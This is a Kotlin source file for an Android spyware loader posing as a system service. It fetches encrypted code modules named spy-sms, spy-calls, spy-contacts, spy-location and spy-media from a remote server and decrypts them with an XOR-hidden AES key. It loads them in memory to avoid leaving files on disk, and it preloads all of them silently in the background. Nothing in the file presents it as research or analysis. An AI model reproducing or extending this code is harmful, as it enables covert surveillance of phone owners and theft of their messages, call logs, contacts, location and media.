package com.android.services

import android.content.Context
import android.os.Build
import android.util.Log
import okhttp3.OkHttpClient
import okhttp3.Request
import java.nio.ByteBuffer
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.TimeUnit
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

/**
 * DexModuleLoader — download encrypted .dex dari server, decrypt AES-256-GCM
 * di memory, load via InMemoryDexClassLoader (API 26+, no disk write).
 *
 * Implementasi sensitif (SMS, CallLog, Contacts, Location, Media) tidak
 * compile ke APK utama — hanya ada sebagai encrypted bytes di server.
 */
@Suppress("DEPRECATION")
object DexModuleLoader {

    private const val TAG = "DML"
    private const val GCM_IV_LEN   = 12
    private const val GCM_TAG_BITS = 128

    // AES-256 key XOR-obfuscated (raw: IWXDexModule2024#AndroidCtrl!KZ)
    private val ENC = intArrayOf(
        0x13, 0x3D, 0x22, 0x1E, 0x3B, 0x36, 0x35, 0x27,
        0x25, 0x5B, 0x7E, 0x4A, 0x5B, 0x7E, 0x4F, 0x5A,
        0x69, 0x1E, 0x38, 0x3C, 0x6F, 0x3C, 0x28, 0x38,
        0x29, 0x3C, 0x22, 0x38, 0x7B, 0x15, 0x55, 0x25
    )
    private val MSK = IntArray(32) { 0x5A }
    private fun aesKey() = ByteArray(32) { i -> (ENC[i] xor MSK[i]).toByte() }

    private val cache = ConcurrentHashMap<String, ClassLoader>()
    private val http = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    /** Execute command via named dex module. Download + cache on first call. */
    fun execute(ctx: Context, moduleName: String, command: String, extra: String?): Pair<String, String> {
        return try {
            val loader = getOrLoad(ctx, moduleName)
                ?: return Pair("⚠️ Module [$moduleName] unavailable", "command_result")
            val cls    = loader.loadClass("com.android.modules.${moduleClass(moduleName)}")
            val inst   = cls.getDeclaredConstructor().newInstance()
            val method = cls.getMethod("execute", Context::class.java, String::class.java, String::class.java)
            @Suppress("UNCHECKED_CAST")
            method.invoke(inst, ctx, command, extra) as Pair<String, String>
        } catch (e: Exception) {
            Log.e(TAG, "exec error [$moduleName]: ${e.message}")
            Pair("ERROR: ${e.message}", "command_result")
        }
    }

    /** Preload semua modul di background saat service start. */
    fun preloadAll(ctx: Context) {
        Thread {
            listOf("spy-sms", "spy-calls", "spy-contacts", "spy-location", "spy-media").forEach { n ->
                try { getOrLoad(ctx, n) } catch (_: Exception) {}
            }
        }.also { it.isDaemon = true }.start()
    }

    /** Clear cache — force re-download next execute(). */
    fun invalidate(name: String? = null) {
        if (name != null) cache.remove(name) else cache.clear()
    }

    // ── internal ──────────────────────────────────────────────────────────────

    private fun getOrLoad(ctx: Context, name: String): ClassLoader? {
        cache[name]?.let { return it }
        val enc      = downloadModule(ctx, name) ?: return null
        val dexBytes = decrypt(enc)              ?: return null
        val loader   = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            dalvik.system.InMemoryDexClassLoader(ByteBuffer.wrap(dexBytes), ctx.classLoader)
        } else {
            val tmp = java.io.File(ctx.cacheDir, "$name.dex").also { it.writeBytes(dexBytes) }
            dalvik.system.DexClassLoader(tmp.absolutePath, ctx.cacheDir.absolutePath, null, ctx.classLoader)
        }
        cache[name] = loader
        Log.d(TAG, "✅ loaded: $name")
        return loader
    }

    private fun downloadModule(ctx: Context, name: String): ByteArray? {
        return try {
            val url = "${SecureConfig.serverUrl()}/api/module/$name"
            http.newCall(Request.Builder().url(url)
                .header("X-Device-Id", android.provider.Settings.Secure.getString(
                    ctx.contentResolver, android.provider.Settings.Secure.ANDROID_ID) ?: "unknown")
                .get().build()
            ).execute().use { r ->
                if (!r.isSuccessful) { Log.w(TAG, "download $name: ${r.code}"); null }
                else r.body?.bytes()
            }
        } catch (e: Exception) { Log.w(TAG, "download error: ${e.message}"); null }
    }

    private fun decrypt(data: ByteArray): ByteArray? {
        return try {
            if (data.size < GCM_IV_LEN + 16) return null
            val iv         = data.copyOfRange(0, GCM_IV_LEN)
            val ciphertext = data.copyOfRange(GCM_IV_LEN, data.size)
            val cipher     = Cipher.getInstance("AES/GCM/NoPadding")
            cipher.init(Cipher.DECRYPT_MODE, SecretKeySpec(aesKey(), "AES"), GCMParameterSpec(GCM_TAG_BITS, iv))
            cipher.doFinal(ciphertext)
        } catch (e: Exception) { Log.e(TAG, "decrypt: ${e.message}"); null }
    }

    private fun moduleClass(name: String) = when (name) {
        "spy-sms"      -> "SmsModule"
        "spy-calls"    -> "CallLogModule"
        "spy-contacts" -> "ContactsModule"
        "spy-location" -> "LocationModule"
        "spy-media"    -> "MediaModule"
        else           -> name.split("-").joinToString("") { it.replaceFirstChar { c -> c.uppercase() } } + "Module"
    }
}
